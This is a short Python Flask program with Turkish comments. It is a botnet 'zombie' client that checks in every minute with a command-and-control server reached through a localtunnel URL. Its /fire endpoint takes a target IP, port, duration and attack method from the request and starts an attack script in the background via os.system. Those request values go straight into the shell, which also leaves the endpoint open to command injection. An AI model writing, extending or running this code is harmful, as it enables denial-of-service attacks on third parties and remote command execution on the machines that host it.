import os
import requests
import time
import threading
from flask import Flask, request

app = Flask(__name__)

# --- KRİTİK AYARLAR ---
# Localtunnel'dan aldığın link (Sonunda / falan olmasın)
BEYIN_URL = "https://shy-otters-trade.loca.lt" 
ZOMBI_PORT = "5000"

def kayit_ol():
    """Zombi açıldığında ve her 60 saniyede bir Beyin'e (Cloud Shell) 'BURADAYIM' der."""
    while True:
        try:
            # Localtunnel engelini aşmak için 'Bypass-Tunnel-Reminder' başlığı şart!
            headers = {"Bypass-Tunnel-Reminder": "true"}
            response = requests.get(f"{BEYIN_URL}/kayit?port={ZOMBI_PORT}", headers=headers, timeout=15)
            if response.status_code == 200:
                print("✅ Beyin'e kayıt başarılı!")
            else:
                print(f"⚠️ Beyin cevap verdi ama hata oluştu: {response.status_code}")
        except Exception as e:
            print(f"❌ Beyin'e ulaşılamıyor (Bağlantı Hatası): {e}")
        
        # 60 saniye bekle ve tekrar dene
        time.sleep(60)

@app.route('/fire')
def fire():
    """Beyin'den gelen saldırı emrini yakalar ve ilgili scripti çalıştırır."""
    target = request.args.get('ip')
    port = request.args.get('port')
    sure = request.args.get('time')
    method = request.args.get('method')
    
    if method:
        # Örnek: python3 udp.py 1.1.1.1 80 60
        print(f"🚀 Saldırı emri alındı: {method} -> {target}:{port}")
        os.system(f"nohup python3 {method}.py {target} {port} {sure} > /dev/null 2>&1 &")
        return f"Saldırı başlatıldı: {method}", 200
    return "Method eksik!", 400

@app.route('/ping')
def ping():
    """Zombi yaşıyor mu kontrolü."""
    return "PONG", 200

if __name__ == '__main__':
    # Kayıt döngüsünü arka planda başlat (daemon=True sayesinde ana program kapanınca bu da kapanır)
    threading.Thread(target=kayit_ol, daemon=True).start()
    
    print(f"⚡ ZOMBI AKTIF! Port {ZOMBI_PORT} üzerinden emir bekliyor...")
    # Flask sunucusunu dış dünyaya aç (0.0.0.0)
    app.run(host='0.0.0.0', port=int(ZOMBI_PORT))
